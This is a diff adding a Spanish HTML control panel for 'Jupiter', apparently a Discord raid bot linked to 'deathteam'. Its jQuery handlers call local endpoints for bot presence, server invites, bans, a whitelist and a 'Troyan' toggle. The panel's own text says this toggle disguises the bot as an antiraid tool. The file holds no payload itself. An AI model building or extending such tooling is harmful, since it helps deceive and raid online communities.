@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  <title>Jupiter</title>
+  <link rel="icon" href="src/logo.gif">
+
+  <script src="script/index.js"></script>
+
+</head>
+
+<body>
+  <h2 class="corner slide">discord.gg/deathteam</h2>
+  <button class="cornerbutton" type="button"></button>
+  <div class="loader">
+    <script type="text/javascript">
+      $(window).on('load', function () {
+        $(".loader").fadeOut(3000);
+      });
+    </script>
+  </div>
+
+  <div class="presentacion slide">
+    <img class="logo" src="src/icon.png" alt="Jupiter">
+    <div class="column-1">
+      <h1 class="titulo">Jupiter Public</h1>
+      <p id="botlog" class="margin-1"></p>
+    </div>
+    <a href="servers.html" target="_blank">
+      <button type="button" class="boton-1 margin-1">Servidores</button>
+    </a>
+    <button type="button" class="boton-1 margin-1" id="reiniciar">Reiniciar</button>
+  </div>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      $.ajax({
+        url: '/botinfo',
+        method: 'GET',
+        success: function (response) {
+          $('#botlog').text('Logged in: ' + response);
+        },
+        error: function (error) {
+        }
+      });
+
+      $.ajax({
+        url: '/invix',
+        method: 'GET',
+        success: function (response) {
+          $('#invitename').text(response.guildname)
+          $('#invitechannel').text('# ' + response.guildchannel)
+          $('#inviteimg').attr('src', response.guildicon);
+          $('#invitetag').text('Por: ' + response.invitertag)
+          $('#invitelink').text(response.link)
+        },
+        error: function (error) {
+        }
+      });
+
+      $("#sendban").click(function () {
+        var dato = $("#idban").val();
+        $.ajax({
+          url: '/idban',
+          method: 'POST',
+          data: { id: dato },
+          success: function (response) {
+            $('#resban').text(response)
+            $('#banres').removeClass('oculto');
+            document.addEventListener('click', function (event) {
+              $('#banres').addClass('oculto')
+            })
+          },
+          error: function (error) {
+            console.error('Error al enviar el dato:', error);
+          }
+        });
+      });
+
+      $("#reiniciar").click(function () {
+        $.ajax({
+          url: '/reiniciar',
+          method: 'POST',
+          data: {},
+          success: function (response) {
+            $('#res').text(response)
+            $('#note').text('Recarga la pagina para ver cambios.')
+            $('#aviso').removeClass('oculto');
+            document.addEventListener('click', function (event) {
+              $('#aviso').addClass('oculto')
+            })
+          },
+          error: function (error) {
+            console.error('Error al enviar el dato:', error);
+          }
+        });
+      });
+    });
+  </script>
+
+
+  <div class="column-3" id="contenido">
+    <div class="cuadro">
+      <h2>Presencia</h2>
+      <form id="miFormulario">
+        <input type="text" id="presence" name="dato" required>
+
+      </form>
+      <button type="button" class="boton-1 margin-3" id="watching" title="Establece viendo"><img src="src/ojo.png"
+          width="30" weight="30"></button>
+      <button type="button" class="boton-1 margin-3" id="playing" title="Establece jugando"><img src="src/mando.png"
+          width="30" weight="30"></button>
+      <button type="button" class="boton-1 margin-3" id="streaming" title="Establece transmitiendo"><img
+          src="src/tv.png" width="30" weight="30"></button>
+
+    </div>
+
+    <script>
+      $(document).ready(function () {
+
+        $("#watching").click(function () {
+          var dato = $("#presence").val();
+          var type = 'WATCHING'
+          $.ajax({
+            url: '/cambiarpresencia',
+            method: 'POST',
+            data: { dato: dato, type: type },
+            success: function (response) {
+              console.log(response)
+            },
+            error: function (error) {
+              console.error('Error al enviar el dato:', error);
+            }
+          });
+        });
+
+        $("#streaming").click(function () {
+          var dato = $("#presence").val();
+          var type = 'STREAMING'
+          $.ajax({
+            url: '/cambiarpresencia',
+            method: 'POST',
+            data: { dato: dato, type: type },
+            success: function (response) {
+              console.log(response)
+            },
+            error: function (error) {
+              console.error('Error al enviar el dato:', error);
+            }
+          });
+        });
+
+        $("#playing").click(function () {
+          var dato = $("#presence").val();
+          var type = 'PLAYING'
+
+          $.ajax({
+            url: '/cambiarpresencia',
+            method: 'POST',
+            data: { dato: dato, type: type },
+            success: function (response) {
+              console.log(response)
+            },
+            error: function (error) {
+              console.error('Error al enviar el dato:', error);
+            }
+          });
+        });
+      });
+
+
+
+    </script>
+
+
+    <div class="cuadro inviter">
+      <img class="logo-1" id="inviteimg" src="" alt="servericon">
+      <div class="column-1">
+        <div class="column-1">
+          <h3 class="titulo" id="invitename">Server Name</h3>
+          <strong>
+            <p id="invitechannel"></p>
+          </strong>
+          <p class="margin-3" id="invitetag"></p>
+        </div>
+
+      </div>
+      <p id="invitelink"></p>
+    </div>
+
+    <div class="cuadro">
+      <h2>Invitacion</h2>
+      <form id="inviteform">
+        <input type="text" id="newinvite" name="dato" required>
+      </form>
+      <button type="button" class="boton-1 margin-3" id="sendinvite" title="Enviar nueva Invitacion.">Enviar</button>
+    </div>
+    
+    <script>
+      function troyanbot() {
+        var interruptor = document.getElementById("interruptor");
+        if (interruptor.checked) {
+          $.ajax({
+            url: '/activartroyan',
+            method: 'POST',
+            success: function (response) {
+              console.log('Enable Troyan, response:', response);
+            },
+            error: function (error) {
+              console.error('Error al manejar clic de botón:', error);
+            }
+
+          });
+
+        } else {
+          $.ajax({
+            url: '/desactivartroyan',
+            method: 'POST',
+            success: function (response) {
+              console.log('Disable Troyan, response:', response);
+            },
+            error: function (error) {
+              console.error('Error al manejar clic de botón:', error);
+            }
+
+          });
+
+        }
+      }
+
+      $(document).ready(function () {
+
+
+        $.ajax({
+          url: '/sendteam',
+          method: 'GET',
+          success: function (response) {
+            $('#actualtm').text('actual: ' + response)
+          },
+          error: function (error) {
+          }
+        });
+
+
+
+        $("#sendinvite").click(function () {
+          var dato = $("#newinvite").val();
+          $.ajax({
+            url: '/cambiarinvite',
+            method: 'POST',
+            data: { invite: dato },
+            success: function (response) {
+              $('#res').text(response)
+              $('#note').text('Recarga la pagina para ver cambios.')
+              $('#aviso').removeClass('oculto');
+              document.addEventListener('click', function (event) {
+                $('#aviso').addClass('oculto')
+              })
+            },
+            error: function (error) {
+              console.error('Error al enviar el dato:', error);
+            }
+          });
+        });
+
+        $("#sendteam").click(function () {
+          var dato = $("#newteam").val();
+          $.ajax({
+            url: '/updateteam',
+            method: 'POST',
+            data: { team: dato },
+            success: function (response) {
+              $('#res').text(response)
+              $('#note').text('Recarga la pagina para ver cambios.')
+              $('#aviso').removeClass('oculto');
+              document.addEventListener('click', function (event) {
+                $('#aviso').addClass('oculto')
+              })
+            },
+            error: function (error) {
+              console.error('Error al enviar el dato:', error);
+            }
+          });
+        });
+
+        $("#sendwhitelist").click(function () {
+          var dato = $("#newwhitelist").val();
+          $.ajax({
+            url: '/addtowhitelist',
+            method: 'POST',
+            data: { id: dato },
+            success: function (response) {
+              $('#res').text(response)
+              $('#note').text('Recarga la pagina para ver cambios.')
+              $('#aviso').removeClass('oculto');
+              document.addEventListener('click', function (event) {
+                $('#aviso').addClass('oculto')
+              })
+            },
+            error: function (error) {
+              console.error('Error al enviar el dato:', error);
+            }
+          });
+        });
+
+        $.ajax({
+          url: '/getwhitelist',
+          method: 'GET',
+          success: function (usuarios) {
+            console.log('Usuarios recibidos:', usuarios);
+            usuarios.forEach(user => {
+              var userDiv = $('<div class="whitelist-user"></div>');
+
+              userDiv.append('<h2 class="margin-4">' + user.name + '</h2>');
+              userDiv.append('<p class="margin-4">' + user.id + '</p>');
+              userDiv.append('<button class="delidButton boton-1 margin-4" title="Eliminar" data-user-id="' + user.id + '">Eliminar</button>');
+
+              // Agrega el div del servidor al contenedor principal
+              $('#whiteContainer').append(userDiv);
+            });
+
+
+          },
+          error: function (error) {
+            console.error('Error al obtener la información de los servidores:', error);
+          }
+        })
+
+        $('#whiteContainer').on('click', '.delidButton', function () {
+          var userId = $(this).data('user-id');
+
+          // Realiza una solicitud AJAX al servidor Node.js con la ID del servidor
+          $.ajax({
+            url: '/delidwhitelist',
+            method: 'POST',
+            data: { userId: userId },
+            success: function (response) {
+              console.log('Delete from whitelist, response:', response);
+              $('#res').text(response)
+              $('#note').text('Recarga la pagina para ver cambios.')
+              $('#aviso').removeClass('oculto');
+              document.addEventListener('click', function (event) {
+                $('#aviso').addClass('oculto')
+              })
+            },
+            error: function (error) {
+              console.error('Error al manejar clic de botón:', error);
+            }
+          });
+        });
+      })
+    </script>
+
+
+    <div class="cuadro">
+      <h2>Team</h2>
+      <p id="actualtm" class="margin-3"></p>
+      <form id="inviteform">
+        <input type="text" id="newteam" name="dato" required>
+      </form>
+      <button type="button" class="boton-1 margin-3" id="sendteam" title="Actualizar equipo.">Enviar</button>
+    </div>
+
+    <div class="cuadro nofree">
+      <h3>Toyano</h3>
+      <p>Encubre tu bot y hacelo pasar por antiraid con slashcommands.</p>
+      <label class="switch ">
+        <input class="nofree" type="checkbox" id="interruptor">
+        <span class="slider round nofree"></span>
+      </label>
+      <h3>Esta funcion no esta disponible en esta version de jupiter.</h3>
+    </div>
+
+    <div id="whiteContainer" class="cuadro nofree">
+      <h2>Usuarios en Whitelist</h2>
+      <h3>Esta funcion no esta disponible en esta version de jupiter.</h3>
+    </div>
+    <div class="cuadro nofree">
+      <h2>Whitelist</h2>
+      <form id="whitelistform">
+        <input type="text" id="newwhitelist" class="nofree" name="dato" required>
+      </form>
+      <button type="button" class="boton-1 margin-3 nofree" id="sendwhitelist"
+        title="Agregar id a la whitelist.">Enviar</button>
+        <h3>Esta funcion no esta disponible en esta version de jupiter.</h3>
+
+    </div>
+
+    <div class="cuadro">
+      <h2>Creditos</h2>
+      <h3>Diseñador</h3>
+      <p"><a href="https://www.instagram.com/rip.skiper">rip.skiper</a></p>
+
+    </div>
+
+    <div class="aviso oculto" id="aviso">
+      <h4 id="res"></h4>
+      <p id="note"></p>
+    </div>
+  </div>
+  <script type="text/javascript">
+
+  </script>
+
+
+
+</body>
+
+</html>
